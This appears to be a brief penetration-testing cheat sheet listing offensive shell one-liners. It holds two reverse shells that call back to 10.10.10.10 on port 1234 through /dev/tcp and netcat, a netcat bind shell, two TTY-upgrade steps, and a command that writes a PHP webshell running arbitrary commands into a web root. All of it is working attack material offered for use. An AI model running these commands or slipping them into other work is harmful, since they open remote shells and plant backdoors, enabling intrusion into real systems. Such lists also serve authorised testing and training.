- `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` – Reverse shell  
- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f` – Reverse shell alt  
- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f` – Bind shell  
- `python -c 'import pty; pty.spawn("/bin/bash")'` – TTY upgrade 1  
- `Ctrl + Z → stty raw -echo → fg → Enter x2` – TTY upgrade 2  
- `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` – PHP webshell  

